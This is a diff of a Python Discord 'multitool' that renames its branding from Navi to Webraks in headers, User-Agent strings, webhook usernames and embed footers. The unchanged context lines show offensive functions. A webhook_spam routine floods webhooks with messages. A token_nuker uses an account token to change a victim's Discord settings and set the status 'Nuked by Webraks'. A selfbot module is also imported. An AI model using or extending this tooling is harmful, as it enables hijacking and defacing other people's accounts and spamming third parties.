@@ -1,12 +1,5 @@
-#  _   _                 _ 
-# | \ | |               (_)
-# |  \| | __ ___   __ _  _ 
-# | . ` |/ _` \ \ / /(_)| |
-# | |\  | (_| |\ V /  _ | |
-# |_| \_|\__,_| \_/  (_)|_|
-# 
-# Navi Multitool - Developed by glockinhand
-# GitHub: https://github.com/glockinhand/webraks-multitool
+# Webraks Multitool - Developed by w3br4ks
+# GitHub: https://github.com/w3br4ks/webraks-multitool
 
 import time, urllib.request, urllib.error, urllib.parse, json, requests, random, string, threading, webbrowser, os, concurrent.futures
 from modules.selfbot import selfbot_menu
@@ -17,7 +10,7 @@ def _snd(url, d, m='POST'):
     try:
         _d = json.dumps(d).encode('utf-8') if d else b''
         r = urllib.request.Request(url, data=(_d if m=='POST' else None), method=m)
-        r.add_header('User-Agent', 'Navi_Wired/1.0')
+        r.add_header('User-Agent', 'Webraks_Wired/1.0')
         r.add_header('Content-Type', 'application/json')
         with urllib.request.urlopen(r) as rs: return rs.status
     except: return -1
@@ -25,7 +18,7 @@ def _snd(url, d, m='POST'):
 def webhook_spam(url, msg, amt=10):
     cl = Theme.get_colors()
     print("\n  [+] Initializing spam...") 
-    sc, p = 0, {"content": msg, "username": "Navi@Multitool", "avatar_url": "https://i.ibb.co/Wv94YGVx/webraks.png"}
+    sc, p = 0, {"content": msg, "username": "Webraks@Multitool", "avatar_url": "https://i.ibb.co/Wv94YGVx/webraks.png"}
     for i in range(amt):
         st = _snd(url, p)
         if st in [200, 204]:
@@ -359,7 +352,7 @@ def token_nuker(tk):
         _active = False
         time.sleep(1)
         print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 4 ] Finalizing..."))
-        _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": "light", "locale": "ja", "custom_status": {"text": "Nuked by Navi"}}, "Set Final White/JP Mode")
+        _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": "light", "locale": "ja", "custom_status": {"text": "Nuked by Webraks"}}, "Set Final White/JP Mode")
         
         print(Colorate.Horizontal(cl["head"], "\n  [=] Nuke completed successfully."))
         input("  Press Enter...")
@@ -548,7 +541,7 @@ def discord_username_checker():
                 timestamp = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                 payload = {
                     "content": "@everyone",
-                    "username": "Navi",
+                    "username": "Webraks",
                     "avatar_url": "https://i.ibb.co/Wv94YGVx/webraks.png",
                     "embeds": [{
                         "title": "✅ Available Username Found!",
@@ -560,7 +553,7 @@ def discord_username_checker():
                         ],
                         "thumbnail": {"url": "https://i.ibb.co/Wv94YGVx/webraks.png"},
                         "footer": {
-                            "text": "Navi Multitool • https://github.com/glockinhand/webraks-multitool",
+                            "text": "Webraks Multitool • https://github.com/w3br4ks/webraks-multitool",
                             "icon_url": "https://i.ibb.co/Wv94YGVx/webraks.png"
                         },
                     }]
